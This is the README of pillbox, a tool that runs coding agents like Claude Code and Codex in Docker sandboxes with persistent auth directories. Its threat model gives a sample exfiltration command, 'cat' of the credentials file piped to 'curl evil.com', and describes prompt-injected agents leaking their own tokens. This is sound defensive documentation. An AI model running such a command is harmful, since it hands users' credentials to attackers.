# pillbox

**Sandboxed coding agents with one-command auth.** Think `gh auth login` for
Claude Code, Codex, and (soon) opencode.

```sh
pillbox claude login           # one-shot OAuth flow inside a Docker sandbox
pillbox claude run             # sandbox + claude with your auth + cwd mounted in
pillbox codex login            # codex uses --device-auth (URL + code, no callback)
pillbox codex run

pillbox auth list              # what's authenticated
pillbox auth rm claude         # forget it
```

## Why

Coding agents need credentials. Running them on bare metal means a misconfigured
prompt / poisoned doc / bad plugin can read whatever's in your shell
environment. Pillbox runs each agent inside a fresh Docker sandbox so the host
environment stays isolated, and gives each agent its own persistent HOME
directory that the agent populates exactly as it does on bare metal.

The login flow is itself sandboxed: `pillbox claude login` runs `claude auth
login` inside a fresh container with a clean `/home/lum` mounted from
`~/.pillbox/data/claude/`. Whatever the agent writes — `.credentials.json`,
profile config, settings, refresh tokens — persists there naturally. Next
`pillbox claude run` re-mounts the same directory and the agent picks up
exactly where it left off.

## Where state lives

```
~/.pillbox/data/claude/         # claude's HOME between runs
  .claude/.credentials.json     # OAuth state
  .claude.json                  # profile config
  .claude/settings.json         # user prefs
  ...                           # whatever else the agent writes to HOME

~/.pillbox/data/codex/          # codex's HOME between runs
  .codex/auth.json
  .codex/config.toml
  ...
```

Directories are 0700, files default to whatever the agent writes (typically
0600 for cred files).

## Threat model (be specific)

Pillbox **does** defend against:
- Agent reading host environment variables or your real `~/.claude` /
  `~/.codex` / `~/.gh` (the sandbox only sees `~/.pillbox/data/<provider>`).
- The login flow itself pulling in host state — the login container is fresh
  every invocation.
- Other tools / scripts on the host accidentally consuming pillbox's auth
  state (it's namespaced under `~/.pillbox/`).

Pillbox **does not** defend against:
- An agent with shell access exfiltrating the credentials it was *given*. A
  prompt-injected agent that runs `cat ~/.claude/.credentials.json && curl
  evil.com` leaks its own token. The v0.4 vault tier addresses this for
  API-key credentials (stub-and-proxy-swap); OAuth subscription tokens are
  treated as a mount, not a vault.
- Stolen unencrypted backups of `~/.pillbox/`. Encryption-at-rest comes from
  your disk encryption (FileVault on macOS, LUKS on Linux, BitLocker on
  Windows). If those aren't on, pillbox's state files are plaintext on
  disk — same posture as `~/.aws/credentials`, `~/.docker/config.json`,
  `~/.gh/hosts.yml`.
- Compromised Docker daemon, container escape, or kernel-level attacks.
  Pillbox uses standard Docker isolation. A `--strict` mode for
  hardware-isolated microVMs via Gondolin is planned for v0.4.

This is the same security posture as the rest of the developer toolchain
(`gh`, `aws`, `docker`, `kubectl`). Pillbox is not a secrets manager — it's
a sandbox runner.

## Status

Pre-alpha. v0.3 supports Claude Code + Codex on macOS. Linux and Windows
work *in theory* (Docker + `$HOME` exist) but haven't been tested.

## Roadmap

- **v0.1** ✅ Claude Code login + run, Docker sandbox
- **v0.2** ✅ Codex adapter; `--workspace` / `--name` / `--mount` ergonomics;
  persistent agent HOME under `~/.pillbox/data/<provider>/`
- **v0.3** ✅ Secrets + env bundles + `pillbox doctor` / `version`
- **v0.4** — Vault tier (stub creds + egress proxy swap for API keys + GitHub
  PATs); `pillbox run --strict` (Gondolin microVMs); per-project
  `pillbox.toml`

## Build (pre-GHCR: requires the lum-built runner image)

```sh
# Build the runner image (until pillbox publishes its own to GHCR)
cd ~/code/lum && bun run build:runtime-image:pillbox

# Build + install the CLI
cd ~/code/pillbox && cargo install --path .

# Use it
pillbox claude login
pillbox claude run
```

## Run-time options

```
pillbox <agent> run                    # mounts cwd at /workspace/<basename>
pillbox <agent> run --workspace PATH   # mount PATH instead of cwd
pillbox <agent> run --name NAME        # override the /workspace/<basename> with /workspace/NAME
pillbox <agent> run --mount A:B        # extra bind mount, repeatable
pillbox <agent> run -- AGENT-ARGS      # forward args to the agent CLI
```

## Documentation

- [AGENTS.md](./AGENTS.md) — agent-facing command reference (one screen)
- [docs/](./docs/) — topic deep dives
  - [secrets.md](./docs/secrets.md) — secrets, env bundles, precedence rules
  - [config.md](./docs/config.md) — per-project `pillbox.toml`
  - [strict.md](./docs/strict.md) — `--strict` Gondolin microVM mode
  - [recipes.md](./docs/recipes.md) — copy-paste flows for common tasks
  - [security.md](./docs/security.md) — threat model and what pillbox defends against

## License

MIT OR Apache-2.0
